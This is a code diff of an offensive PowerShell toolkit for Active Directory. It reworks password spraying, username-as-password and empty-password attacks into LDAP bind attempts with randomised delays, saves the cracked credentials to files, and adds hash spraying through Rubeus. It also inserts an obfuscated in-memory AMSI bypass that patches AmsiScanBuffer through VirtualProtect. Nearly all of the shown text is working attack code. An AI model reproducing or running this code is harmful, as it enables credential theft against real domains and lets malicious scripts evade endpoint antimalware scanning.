@@ -3262,15 +3262,16 @@ Function SessionHunter {
     foreach ($Computer in $Computers) {
         $OS = $Computer.Properties["operatingSystem"][0]
         $ComputerName = $Computer.Properties["dnshostname"][0]
-
+        write-host $ComputerName
         $ScriptBlock = {
            Param($OS, $ComputerName, $Domain, $NameLength, $OSLength, $Sessions, $SuccessOnly)
             $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
 	        $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
 	        $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
 	        IF ($wait){ 
-		    try{$tcpClient.EndConnect($asyncResult)
-		    $tcpClient.Close()}Catch{}
+		    $tcpClient.EndConnect($asyncResult)
+		    $tcpClient.Close()
+            Write-Host $ComputerName
 
             $userSIDs = $null
             $userKeys = $null
@@ -3536,10 +3537,102 @@ $searchResult = $searcher.FindOne()
                 if (!$SuccessOnly){
                     Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                     Write-Host "$Domain\$UserToSpray - Safe threshold met"
-                    continue
+                    return
     }
 }
 
+
+    # Password Spraying
+   if ($Password -ne ""){
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
+        
+        if ($Attempt.name -ne $null){
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            "$Domain\${UserToSpray}:$password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
+}
+
+        else {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+        }
+    
+}
+
+
+    # Account as password
+    if ($AccountAsPassword){
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$UserToSpray)
+        
+        if ($Attempt.name -ne $null){
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
+}
+
+        else {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+        }
+    
+}
+
+
+    # EmptyPasswords
+    if ($EmptyPassword){
+    $password = ""
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
+        
+        if ($Attempt.name -ne $null){
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
+}
+
+        else {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+        }
+    
+}
+
+    # Hash Spraying
+    if ($Hash -ne "") {
+
+$MaxConcurrentJobs = "5"
+Function Invoke-NETMongoose{
+# Based on the original code by Gustav Shen
+function lf{param($m,$f)$a=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache-and$_.Location.Split('\')[-1]-eq'System.dll'}|%{$_.'GetType'('Microsoft.Win32.UnsafeNativeMethods')}
+$t=$a.'GetMethods'()|?{$_.Name-like'Ge*P*oc*ddress'}
+$t[0].'Invoke'($null,@(($a.'GetMethod'('GetModuleHandle')).'Invoke'($null,@($m)),$f))}
+function g{Param($f,$d=[Void])$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly([System.Reflection.AssemblyName]'R',[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('I',$false).DefineType('M','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])
+$t.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$f).SetImplementationFlags('Runtime,Managed')
+$t.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$d,$f).SetImplementationFlags('Runtime,Managed')
+return $t.CreateType()}
+$a="A";$b="msiS";$c="canB";$d="uffer"
+[IntPtr]$f=lf amsi.dll ($a+$b+$c+$d);$o=0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lf kernel32.dll VirtualProtect),(g @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType())([Bool])))
+$vp.Invoke($f,3,0x40,[ref]$o)>$null
+$b=[Byte[]](0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+[System.Runtime.InteropServices.Marshal]::Copy($b,0,$f,12)}
+Invoke-NETMongoose
+$Delay = Get-Random -Minimum 69 -Maximum 800
+Start-Sleep -Milliseconds $Delay
 function Invoke-Rubeus{
     [CmdletBinding()]
     Param (
@@ -3581,10 +3674,8 @@ function Invoke-Rubeus{
      [Console]::SetOut($OldConsoleOut)
     $Results = $StringWriter.ToString()
     $Results
-    }    
+    }
 
-    # Hash Spraying
-    if ($Hash -ne "") {
 
 
             if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
@@ -3612,104 +3703,7 @@ function Invoke-Rubeus{
                 
         }
     }
-
-    # Password Spraying
-
-   if ($Password -ne ""){
-
-
-        # Generate a random delay between attempts
-		$Delay = Get-Random -Minimum 69 -Maximum 800
-		Start-Sleep -Milliseconds $Delay
-        
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$Password /domain:$domain" | Out-String
-        
-        # Check for Unhandled Rubeus exception
-        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
-            if (!$SuccessOnly){
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "$Domain\$UserToSpray"
-     }   
-        } 
-        
-        # Check for KDC_ERR_PREAUTH_FAILED
-        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
-            if (!$SuccessOnly){
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "$Domain\$UserToSpray"
-    }    
-        }
-        
-        # Check for TGT request success
-        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
-            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-            "$Domain\${UserToSpray}:$Password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
-        }
-    
 }
-
-
-    # Account as password
-    if ($AccountAsPassword){
-
-
-        # Generate a random delay between attempts
-		$Delay = Get-Random -Minimum 69 -Maximum 800
-		Start-Sleep -Milliseconds $Delay
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$UserToSpray /domain:$domain" | Out-String
-        
-        # Check for Unhandled Rubeus exception
-        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-        } 
-        # Check for KDC_ERR_PREAUTH_FAILED
-        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-        }
-        # Check for TGT request success
-        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
-            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-            "$Domain\$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountsAsPassword-Users.txt" -Encoding "ASCII" -Append
-        }  
-}
-
-
-    # EmptyPasswords
-    if ($EmptyPassword){
-
-        # Generate a random delay between attempts
-		$Delay = Get-Random -Minimum 69 -Maximum 800
-		Start-Sleep -Milliseconds $Delay
-        
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password: /domain:$domain" | Out-String
-        
-        # Check for Unhandled Rubeus exception
-        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-        } 
-        
-        # Check for KDC_ERR_PREAUTH_FAILED
-        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-            
-        }
-        
-        # Check for TGT request success
-        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
-            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-            Write-Host "$Domain\$UserToSpray"
-            "$Domain\$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-EmptyPasswords.txt" -Encoding "ASCII" -Append
-            
-            }
-        } 
-        
-        }
 
 # Check if the number of currently running jobs is below the maximum limit
         while (($SprayJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
